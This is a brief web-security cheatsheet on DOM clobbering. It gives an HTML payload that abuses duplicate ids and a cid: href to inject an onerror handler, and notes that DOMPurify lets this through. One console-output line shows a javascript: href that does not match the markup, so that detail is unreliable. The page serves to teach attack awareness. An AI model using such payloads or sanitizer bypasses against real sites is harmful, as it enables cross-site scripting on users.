---
title: DOM Clobbering
description: DOM Clobbering cheatsheet
---

## Definition

**DOM Clobbering** is a type of attack that involves **overwriting the properties of a Document Object Model (DOM)** object in a web page with malicious code. This can allow an attacker to execute arbitrary JavaScript code in the victim's browser, potentially leading to the theft of sensitive information or other malicious activities. The term "clobbering" refers to the way in which the attacker overwrites the properties of the DOM object, effectively "clobbering" the original values with their own. DOM Clobbering attacks are often used in conjunction with cross-site scripting (XSS) attacks, and can be difficult to defend against. It is important for web developers to be aware of this type of attack and take steps to prevent it.

## Cheatsheet

```html
<div id="defaultAvatar"></div>
<a id="defaultAvatar" name="avatar" href="cid:&quot;onerror=alert(1)//">
```

```javascript
window.defaultAvatar
// HTMLCollection(2) [div#defaultAvatar, a#defaultAvatar, defaultAvatar: div#defaultAvatar, avatar: a#defaultAvatar]
defaultAvatar
// HTMLCollection(2) [div#defaultAvatar, a#defaultAvatar, defaultAvatar: div#defaultAvatar, avatar: a#defaultAvatar]

defaultAvatar.avatar
// <a id="defaultAvatar" name="avatar" href="javascript:alert()"></a>
defaultAvatar.avatar + ''
// 'cid:"onerror=alert(1)//'
```

> `DOMPurify` allows you to use the `cid:` protocol, which does **not** URL-encode double-quotes.

## References

- [PortSwigger - DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)